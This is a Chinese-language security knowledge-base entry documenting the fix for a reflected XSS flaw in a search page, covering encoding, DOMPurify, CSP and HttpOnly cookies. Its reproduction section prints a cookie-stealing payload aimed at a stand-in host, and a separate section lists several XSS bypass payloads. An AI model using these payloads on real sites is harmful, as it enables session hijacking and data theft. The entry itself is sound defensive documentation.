---
id: "KP-EXP-SEC-001"
type: "security"
severity: "high"
category: "xss"
tags: ["xss", "frontend", "sanitization", "反射型XSS", "输入过滤", "输出编码"]
version: "1.0.0"
created: "2026-04-28T10:00:00Z"
updated: "2026-04-28T10:00:00Z"
source: "auto_precipitation"
confidence: 0.95
last_validated: "2026-04-28T10:00:00Z"
success_count: 0
failure_count: 0
occurrences: 2
trigger: "vulnerability_fix_completed"
references:
  - id: "KP-GEN-021"
    relation: "refines"
  - id: "KP-GEN-020"
    relation: "complies"
---

# 搜索功能反射型 XSS 漏洞修复

## 漏洞描述

在商品搜索功能中，用户输入的搜索关键词未经转义直接渲染到页面，导致反射型 XSS（Cross-Site Scripting）攻击。攻击者可构造恶意链接，诱导用户点击后在其浏览器中执行任意 JavaScript 代码。

### 漏洞复现

攻击者构造如下 URL：

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

服务端将 `q` 参数值原样插入 HTML 模板，恶意脚本在受害者浏览器中执行，窃取 Cookie 和 Session 信息。

### 影响范围

- 用户 Cookie/Session 劫持
- 用户敏感信息泄露
- 替代用户执行操作（CSRF 升级版）
- 钓鱼攻击载体

---

## 攻击向量分析

### 1. 基础注入

```
?q=<script>alert('XSS')</script>
```

### 2. 事件处理器绕过

```
?q=" onmouseover="alert('XSS')" data-x="
?q=<img src=x onerror=alert('XSS')>
```

### 3. 编码绕过

```
?q=%3Cscript%3Ealert('XSS')%3C/script%3E
?q=&#60;script&#62;alert('XSS')&#60;/script&#62;
```

### 4. 模板注入组合

```
?q={{constructor.constructor('alert(1)')()}}
```

---

## 修复方案

### 1. 服务端输出编码

```python
import html

def search_products(query: str):
    safe_query = html.escape(query, quote=True)
    products = product_repo.search(query)
    return {
        "query": safe_query,
        "products": products,
    }
```

### 2. 前端框架安全渲染

#### React — 默认转义

```tsx
function SearchResults({ query }: { query: string }) {
    return (
        <div>
            <p>搜索结果：{query}</p>
        </div>
    );
}
```

#### Vue — v-text 替代 v-html

```vue
<template>
    <div>
        <p>搜索结果：{{ query }}</p>
    </div>
</template>
```

### 3. DOMPurify 净化（必须渲染 HTML 时）

```typescript
import DOMPurify from "dompurify";

function SafeHTML({ html }: { html: string }) {
    const clean = DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
        ALLOWED_ATTR: ["href"],
        ALLOW_DATA_ATTR: false,
    });
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

### 4. Content Security Policy 头

```python
from starlette.middleware.base import BaseHTTPMiddleware

class CSPMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self' 'unsafe-inline'; "
            "img-src 'self' data:; "
            "connect-src 'self'; "
            "frame-ancestors 'none'; "
            "form-action 'self'"
        )
        return response
```

### 5. HttpOnly Cookie 防护

```python
from starlette.responses import Response

def set_session_cookie(response: Response, token: str):
    response.set_cookie(
        key="session_id",
        value=token,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=3600,
    )
```

---

## 验证步骤

| 步骤 | 操作 | 预期结果 |
|------|------|---------|
| 1 | 输入 `<script>alert(1)</script>` 搜索 | 脚本不执行，显示为纯文本 |
| 2 | 输入 `" onmouseover="alert(1)"` | 属性不被注入，引号被转义 |
| 3 | 输入 `<img src=x onerror=alert(1)>` | 标签被转义或过滤 |
| 4 | 输入 URL 编码的恶意脚本 | 解码后仍被正确转义 |
| 5 | 检查 HTTP 响应头 | 包含 CSP 和 X-Content-Type-Options |
| 6 | 检查 Cookie 属性 | HttpOnly + Secure + SameSite |
| 7 | 自动化扫描 | OWASP ZAP / Burp Suite 无 XSS 告警 |

---

## 预防清单

| 检查项 | 要求 | 说明 |
|--------|------|------|
| 输出编码 | 所有用户输入渲染前必须编码 | HTML 上下文用 HTML 实体编码 |
| v-html / dangerouslySetInnerHTML | 禁止使用或配合 DOMPurify | 优先使用框架默认转义 |
| CSP 头 | 部署严格的 Content-Security-Policy | 禁止 inline script 和 eval |
| Cookie 安全 | HttpOnly + Secure + SameSite | 防止 JavaScript 读取 Cookie |
| 输入验证 | 白名单验证搜索关键词格式 | 限制长度和字符集 |
| 安全扫描 | CI 集成 XSS 自动检测 | 每次部署前运行扫描 |
| 代码审查 | 检查所有用户输入输出点 | 关注模板渲染和 DOM 操作 |

## 相关知识

- [KP-GEN-021] OWASP Top 10 概述 — XSS 防护策略
- [KP-GEN-020] 安全编码基础 — 输入验证与输出编码
